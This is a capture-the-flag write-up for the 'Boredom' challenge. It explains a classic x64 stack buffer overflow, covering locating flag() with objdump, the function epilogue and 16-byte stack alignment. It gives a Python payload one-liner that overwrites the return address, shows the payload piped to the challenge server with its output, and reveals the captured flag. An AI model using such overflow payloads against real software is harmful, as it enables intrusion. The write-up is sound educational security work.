# Boredom

This CTF is a simple stack overflow.

Based on the C code, we have a 200 byte buffer that lives on the stack. In fact, it is the only variable on the stack.
We also know there is a function, called `flag()`, that if called will give us the flag.

So, what address does `flag()` have?

```
$ objdump -t boredom | grep flag
00000000004011d5 g     F .text  000000000000008b              flag
```

IE: `flag()` is at `0x4011d5`.

## The Textbook Solution

`main()` is a regular function.  It has a return value. The epilogue of the function looks something like this:

```asm
leave
ret
```

Where `leave` is equivalent to `mov rsp, rbp; pop rbp` and `ret` is an instruction that is equivalent to `pop rip`.

So, on net, the function epilogue looks like this:

```asm
mov rsp, rbp
pop rbp ; Pop 8 bytes off the stack
pop rip ; Pop another 8 bytes off the stack.
```

For a "by-the-book" stack overflow, you should therefore fill the buffer (200 bytes). Then write 8 more bytes (this value will be popped off the stack and end up in rbp), and finally write 8 bytes representing the target address you wish to jump to (in this case `0x4011d5`).

### Exploit Script:

Here is a simple way to generate an input of 208 dummy bytes, followed by our desired address:

```bash
python -c 'print "U"*208 + "\xd5\x11\x40\x00\x00\x00\x00\x00"'
```

> Note: we don't actually care about corrupting rbp, since we don't need it.
Also, we had to reverse the order of the bytes of our address since x64 processors are little-endian.

## Testing the solution

Since we have a copy of the binary, let's try it out:

```
$ python -c 'print "U"*208 + "\xd5\x11\x40\x00\x00\x00\x00\x00"' | ./boredom
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: Ehhhhh, maybe later.
Segmentation fault (core dumped)
```

> Shit. That didn't work. What the hell?

Well, it turns out that compilers for x64 systems don't *like* allocating **only** 200 bytes on the stack. Normally, they allocate the stack such that it has a 16 byte alignment. If you look closely at the assembly dump of the binary, you'll see that it actually allocates 0xd0 (or 208) bytes for the stack (Note that 208 is a multiple of 16).

Therefore, after our buffer there is an *extra* 8 bytes of allocated but unused memory.

Let's try accounting for those 8 bytes:

```
$ python -c 'print "U"*216 + "\xd5\x11\x40\x00\x00\x00\x00\x00"' | ./boredom
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: Ehhhhh, maybe later.
You're running this locally or I can't access the flag file for some reason.
If this occurs on the remote, ping @PMP#5728 on discord server.
```

**BOOM**. That's better.

> Note: It actually turns out to be pretty tricky to get compilers to emit the code without this alignment requirement (linux on x64 mandates it as part of the calling convention). In principal, gcc has a tunable option for what the stack alignment should be: `-mpreferred-stack-boundary=num` (defaults to 4 for 2^4 byte alignment), but I didn't have any luck lowering it.

## Capture the Flag!

```
$ python -c 'print "U"*216 + "\xd5\x11\x40\x00\x00\x00\x00\x00"' | nc pwn.hsctf.com 5002
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: Ehhhhh, maybe later.
```

> Wait. WHAT? We tested this already.

Ok, so here's the deal. The solution to this challenge is **actually** the textbook example. The binary has been specifically manufactured to behave as-if it didn't have the buffer aligned to a 16-byte boundary. (Presumably by padding or offsetting the buffer slightly such that the 200 byte buffer actually is the last thing on the stack.)

## Capture the Flag (For Realz!)


Ok. So let's try the "textbook" solution:

<details><summary>Spoiler (Output Includes Flag)</summary>
<p>

```
$ python -c 'print "U"*208 + "\xd5\x11\x40\x00\x00\x00\x00\x00"' | nc pwn.hsctf.com 5002
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: Ehhhhh, maybe later.
Hey, that's a neat idea. Here's a flag for your trouble: flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}

Now go away.
```

</p>
</details>

---

Andrew Steadman
